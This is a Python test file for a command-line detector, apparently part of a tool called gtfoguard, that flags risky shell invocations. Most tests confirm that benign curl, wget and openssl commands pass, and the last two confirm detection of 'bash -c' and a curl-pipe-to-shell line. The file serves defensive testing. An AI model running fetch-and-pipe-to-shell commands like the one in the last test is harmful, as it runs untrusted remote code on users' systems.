from gtfoguard.detectors.cmdline import CommandLineDetector


def _detect(make_snapshot, name, cmdline):
    snapshot = make_snapshot(name=name, cmdline=cmdline)
    return CommandLineDetector().detect([snapshot])


def test_install_sh_url_does_not_trigger_shell_detection(make_snapshot):
    results = _detect(make_snapshot, "curl", ["curl", "https://example.com/install.sh"])
    assert results == []


def test_benign_url_containing_bash_does_not_trigger(make_snapshot):
    results = _detect(make_snapshot, "wget", ["wget", "http://host.org/setup-bash.tar.gz"])
    assert results == []


def test_flag_containing_enc_substring_does_not_trigger(make_snapshot):
    results = _detect(make_snapshot, "openssl", ["openssl", "dgst", "-encoding", "hex"])
    assert results == []


def test_genuine_bash_dash_c_still_triggers(make_snapshot):
    results = _detect(make_snapshot, "bash", ["bash", "-c", "id"])
    assert len(results) == 1
    assert results[0].matched_name == "bash -c"


def test_genuine_curl_pipe_to_shell_still_triggers(make_snapshot):
    results = _detect(make_snapshot, "curl", ["curl", "http://x", "|", "sh"])
    assert len(results) == 1
    assert results[0].matched_name == "curl pipe"
